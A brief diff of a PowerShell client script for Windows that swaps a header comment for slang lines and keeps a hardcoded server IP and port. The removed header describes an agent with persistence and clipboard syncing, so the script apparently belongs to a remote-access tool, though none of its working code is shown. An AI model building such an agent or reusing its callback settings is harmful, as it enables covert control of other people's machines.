@@ -1,5 +1,6 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent + Persistencia + Clipboard Sync + Áudio Extensible + Novo Banner
+#  vqq no topo gostoso
+#  nottigang no topo ladrao
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
